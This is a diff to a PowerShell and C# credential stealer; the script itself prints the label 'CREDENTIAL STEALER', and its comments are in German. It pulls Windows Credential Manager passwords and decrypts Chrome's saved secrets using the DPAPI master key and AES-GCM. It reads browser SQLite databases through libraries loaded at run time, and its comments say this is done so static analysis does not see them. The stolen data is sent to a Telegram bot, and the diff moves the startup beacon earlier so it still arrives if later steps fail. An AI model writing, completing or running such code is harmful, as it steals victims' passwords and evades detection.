@@ -94,42 +94,66 @@ $_sqfn = @(
 function Send-TgMessage {
     param([string]$Text)
     try {
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
-            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
+        Invoke-RestMethod -Uri ("https://api.telegram.org/bot" + $script:BOT_TOKEN + "/sendMessage") `
+            -Method POST -Body @{ chat_id = $script:CHAT_ID; text = $Text } | Out-Null
     } catch { }
 }
 
 function Send-TgFile {
     param([string]$Filename, [string]$Content, [string]$Caption = "")
     try {
-        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
+        Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
         $http = [System.Net.Http.HttpClient]::new()
         $form = [System.Net.Http.MultipartFormDataContent]::new()
-        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
-        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
+        $form.Add([System.Net.Http.StringContent]::new($script:CHAT_ID),  "chat_id")
+        $form.Add([System.Net.Http.StringContent]::new($Caption),         "caption")
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
         $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
         $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
         $form.Add($fc, "document", $Filename)
-        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
+        $http.PostAsync("https://api.telegram.org/bot" + $script:BOT_TOKEN + "/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
         $http.Dispose()
     } catch { }
 }
 
-# ── Win32 P/Invoke ────────────────────────────────────────────
-# kernel32 in DllImport: unverdaechtige System-DLL.
-# advapi32 + winsqlite3 werden per GetProcAddress zur Laufzeit geladen —
-# ihre Namen und Funktionen erscheinen NICHT im statisch analysierten Source.
+# Fruehzeitig senden - falls Add-Type spaeter fehlschlaegt, kommt zumindest diese Meldung an
+Send-TgMessage "[CREDSTEALER] $env:COMPUTERNAME\$env:USERNAME gestartet"
 
-Add-Type -ErrorAction SilentlyContinue @"
+# ── Win32 P/Invoke ────────────────────────────────────────────
+# Delegates auf Namespace-Ebene (nicht nested) - garantiert kompilierbar in csc.exe / PS 5.1.
+# kernel32 in DllImport unverdaechtig; advapi32 + winsqlite3 nur per GetProcAddress zur Laufzeit.
+
+try { Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Text;
 
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet=CharSet.Unicode, SetLastError=true)]
+public delegate bool FnCE(string f, int fl, out int n, out System.IntPtr p);
+[UnmanagedFunctionPointer(CallingConvention.StdCall)]
+public delegate void FnCF(System.IntPtr p);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate int DbO(string f, out System.IntPtr d);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate int DbP(System.IntPtr d, string s, int n, out System.IntPtr t, System.IntPtr z);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate int DbS(System.IntPtr t);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate System.IntPtr DbCt(System.IntPtr t, int c);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate System.IntPtr DbCb(System.IntPtr t, int c);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate int DbCz(System.IntPtr t, int c);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate int DbF(System.IntPtr t);
+[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+public delegate int DbC(System.IntPtr d);
+
 public class WN {
-    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
-    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")] public static extern System.IntPtr LoadLibrary(string l);
+    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
+    public static extern System.IntPtr GetProcAddress(System.IntPtr h, string p);
 
     [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
     public struct CR {
@@ -137,28 +161,23 @@ public class WN {
         public string TN, Cm;
         public long LW;
         public uint BS;
-        public IntPtr Bl;
+        public System.IntPtr Bl;
         public uint Pe, AC;
-        public IntPtr At;
+        public System.IntPtr At;
         public string Al, UN;
     }
 
-    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet=CharSet.Unicode, SetLastError=true)]
-    public delegate bool FnCE(string f, int fl, out int n, out IntPtr p);
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate void FnCF(IntPtr p);
-
-    public static List<string[]> DC(IntPtr pCE, IntPtr pCF) {
+    public static List<string[]> DC(System.IntPtr pCE, System.IntPtr pCF) {
         var r = new List<string[]>();
         var fE = (FnCE)Marshal.GetDelegateForFunctionPointer(pCE, typeof(FnCE));
         var fF = (FnCF)Marshal.GetDelegateForFunctionPointer(pCF, typeof(FnCF));
-        int n; IntPtr p;
+        int n; System.IntPtr p;
         if (!fE(null, 0, out n, out p)) return r;
         try {
             for (int i = 0; i < n; i++) {
-                var c = (CR)Marshal.PtrToStructure(Marshal.ReadIntPtr(p, i * IntPtr.Size), typeof(CR));
+                var c = (CR)Marshal.PtrToStructure(Marshal.ReadIntPtr(p, i * System.IntPtr.Size), typeof(CR));
                 string pw = "";
-                if (c.BS > 0 && c.Bl != IntPtr.Zero) {
+                if (c.BS > 0 && c.Bl != System.IntPtr.Zero) {
                     var b = new byte[c.BS];
                     Marshal.Copy(c.Bl, b, 0, (int)c.BS);
                     pw = Encoding.Unicode.GetString(b);
@@ -171,20 +190,8 @@ public class WN {
 }
 
 public class Sqdb {
-    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string l);
-    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)] static extern IntPtr GetProcAddress(IntPtr h, string p);
-
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fo(string f, out IntPtr d);
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fp(IntPtr d, string s, int n, out IntPtr t, IntPtr z);
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fst(IntPtr t);
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate IntPtr Fct(IntPtr t, int c);
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate IntPtr Fcb(IntPtr t, int c);
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fcz(IntPtr t, int c);
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fff(IntPtr t);
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fcl(IntPtr d);
-
-    static string PU(IntPtr p) {
-        if (p == IntPtr.Zero) return "";
+    static string PU(System.IntPtr p) {
+        if (p == System.IntPtr.Zero) return "";
         var buf = new List<byte>();
         int off = 0; byte b;
         while ((b = Marshal.ReadByte(p, off++)) != 0) buf.Add(b);
@@ -194,30 +201,30 @@ public class Sqdb {
     public static List<object[]> Q(string path, string sql, int cols, int[] bc, string dll, string[] fn) {
         var r = new List<object[]>();
         try {
-            IntPtr lib = LoadLibrary(dll);
-            if (lib == IntPtr.Zero) return r;
-            var fO  = (Fo) Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[0]), typeof(Fo));
-            var fP  = (Fp) Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[1]), typeof(Fp));
-            var fSt = (Fst)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[2]), typeof(Fst));
-            var fCt = (Fct)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[3]), typeof(Fct));
-            var fCb = (Fcb)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[4]), typeof(Fcb));
-            var fCz = (Fcz)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[5]), typeof(Fcz));
-            var fFf = (Fff)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[6]), typeof(Fff));
-            var fCl = (Fcl)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[7]), typeof(Fcl));
+            System.IntPtr lib = WN.LoadLibrary(dll);
+            if (lib == System.IntPtr.Zero) return r;
+            var fO  = (DbO) Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[0]), typeof(DbO));
+            var fP  = (DbP) Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[1]), typeof(DbP));
+            var fSt = (DbS) Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[2]), typeof(DbS));
+            var fCt = (DbCt)Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[3]), typeof(DbCt));
+            var fCb = (DbCb)Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[4]), typeof(DbCb));
+            var fCz = (DbCz)Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[5]), typeof(DbCz));
+            var fFf = (DbF) Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[6]), typeof(DbF));
+            var fCl = (DbC) Marshal.GetDelegateForFunctionPointer(WN.GetProcAddress(lib, fn[7]), typeof(DbC));
             var blobSet = new HashSet<int>(bc);
-            IntPtr db;
+            System.IntPtr db;
             if (fO(path, out db) != 0) return r;
             try {
-                IntPtr st;
-                if (fP(db, sql, -1, out st, IntPtr.Zero) != 0) return r;
+                System.IntPtr st;
+                if (fP(db, sql, -1, out st, System.IntPtr.Zero) != 0) return r;
                 try {
                     while (fSt(st) == 100) {
                         var row = new object[cols];
                         for (int c = 0; c < cols; c++) {
                             if (blobSet.Contains(c)) {
-                                IntPtr bp = fCb(st, c);
+                                System.IntPtr bp = fCb(st, c);
                                 int len = fCz(st, c);
-                                var bArr = new byte[bp != IntPtr.Zero && len > 0 ? len : 0];
+                                var bArr = new byte[bp != System.IntPtr.Zero && len > 0 ? len : 0];
                                 if (bArr.Length > 0) Marshal.Copy(bp, bArr, 0, len);
                                 row[c] = bArr;
                             } else {
@@ -232,7 +239,7 @@ public class Sqdb {
         return r;
     }
 }
-"@
+"@ } catch {}
 
 Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
 
@@ -250,10 +257,10 @@ try {
 function Get-ChromeMasterKey {
     param([string]$UserDataPath)
     try {
-        $ls = Join-Path $UserDataPath $_ls
+        $ls = Join-Path $UserDataPath $script:_ls
         if (-not (Test-Path $ls)) { return $null }
         $json = [IO.File]::ReadAllText($ls) | ConvertFrom-Json
-        $b64  = $json.($_osc).($_ek)
+        $b64  = $json.($script:_osc).($script:_ek)
         if (-not $b64) { return $null }
         $raw = [Convert]::FromBase64String($b64)[5..999999]
         return [Security.Cryptography.ProtectedData]::Unprotect(
@@ -279,7 +286,7 @@ function Decrypt-ChromeBlob {
     $tag  = $rest[($rest.Length-16)..($rest.Length-1)]
     try {
         $aesT = [AppDomain]::CurrentDomain.GetAssemblies() |
-            ForEach-Object { try { $_.GetType($_aes) } catch { $null } } |
+            ForEach-Object { try { $_.GetType($script:_aes) } catch { $null } } |
             Where-Object { $_ -ne $null } | Select-Object -First 1
         if (-not $aesT) { return "(AES-GCM nicht verfuegbar)" }
         $aes = [Activator]::CreateInstance($aesT, [object[]]@([byte[]]$MasterKey))
@@ -300,8 +307,6 @@ $browsers = @(
 )
 
 # ── Report aufbauen ───────────────────────────────────────────
-
-Send-TgMessage "[CREDSTEALER] $env:COMPUTERNAME\$env:USERNAME gestartet"
 
 $sb = [Text.StringBuilder]::new()
 $null = $sb.AppendLine("=== CREDENTIAL STEALER | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
